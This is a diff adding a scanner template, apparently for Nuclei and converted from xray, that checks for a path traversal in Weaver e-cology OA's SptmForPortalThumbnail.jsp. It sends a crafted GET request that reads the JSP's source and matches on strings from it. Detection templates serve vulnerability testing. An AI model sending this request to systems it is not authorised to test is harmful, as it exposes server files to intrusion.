@@ -1,0 +1,26 @@
+id: poc-yaml-weaver-oa-sptmforportalthumbnail-jsp-path-traversal
+
+info:
+  name: poc-yaml-weaver-oa-sptmforportalthumbnail-jsp-path-traversal
+  author: socat
+  severity: high
+  tags: xray-converted,traversal,ct-479157
+  reference:
+    - http://124.223.89.192/archives/e-cology8-14
+
+http:
+  - raw:
+      - |
+        GET /portal/SptmForPortalThumbnail.jsp?preview=portal/SptmForPortalThumbnail.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "weaver.general.BaseBean"
+          - "getServletConfig"
